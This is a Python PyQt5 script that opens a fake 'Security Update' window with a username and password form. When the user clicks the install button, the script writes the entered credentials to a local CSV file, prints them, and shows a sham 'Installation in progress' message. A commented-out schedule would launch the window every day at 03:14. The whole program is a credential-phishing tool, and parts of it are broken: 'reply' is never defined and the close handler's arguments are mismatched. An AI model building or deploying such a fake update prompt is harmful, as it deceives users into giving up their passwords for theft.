import sys
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QDialog, QApplication, QMessageBox
from PyQt5.uic import loadUi
import csv
import os.path
import schedule
import time



class Login(QDialog):
    def __init__(self):
        super(Login,self).__init__()
        loadUi("login.ui",self)
        
        self.install.clicked.connect(self.loginfunction)
        self.password.setEchoMode(QtWidgets.QLineEdit.Password)
        self.cancel.clicked.connect(self.cancelupdate)


        
    def loginfunction(self):
        username=self.username.text()
        password=self.password.text()
        fields = ["User Name","Password"]
        rows = [username,password]
        print("Successfully logged in with username: ", username, "and password:", password)

        if os.path.exists('logincred.csv'):
            csvfile = open('logincred.csv','a',newline='')
            csvwriter = csv.writer(csvfile)
        else:
            csvfile = open('logincred.csv','w',newline='')
            csvwriter = csv.writer(csvfile)
            csvwriter.writerow(fields)
        
        csvwriter.writerow(rows)

        csvfile.close()
        msg = QMessageBox()
        msg.setText("Installation in progress")
        msg.setWindowTitle("Installing...")
        msg.setIcon(QMessageBox.Information)
        msg.setStyleSheet("QLabel{ color: black}; background-color: white; color: rgb(255, 255, 255)")
        msg.exec_()

        if reply == QMessageBox.Ok:
            self.closewindow()

    def cancelupdate(self,event):
        msg = QMessageBox()
        #msg.question(self,'Cancel Update','Are you sure you do not want to update?',QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        msg.setText("Are you sure you do not want to update?")
        msg.setWindowTitle("Cancel Update")
        msg.setIcon(QMessageBox.Question)
        msg.setStandardButtons(QMessageBox.Yes|QMessageBox.No)
        msg.setStyleSheet("QLabel{color: black}; background-color: white; color: rgb(255, 255, 255)")
        msg.exec_()

        if reply == QMessageBox.Yes:
            self.closewindow()
        else:
            return
        
    
    def closewindow(self,event):
        event.accept()


def maincall():
    app=QApplication(sys.argv)
    mainwindow=Login()
    widget=QtWidgets.QStackedWidget()
    widget.addWidget(mainwindow)
    widget.setFixedWidth(1100)
    widget.setFixedHeight(550)
    widget.show()
    widget.setWindowTitle("Security Update")
    sys.exit(app.exec_())

'''schedule.every().day.at("03:14").do(maincall)

while True:
  
    # Checks whether a scheduled task 
    # is pending to run or not
    schedule.run_pending()
    time.sleep(1)
    
'''
maincall()
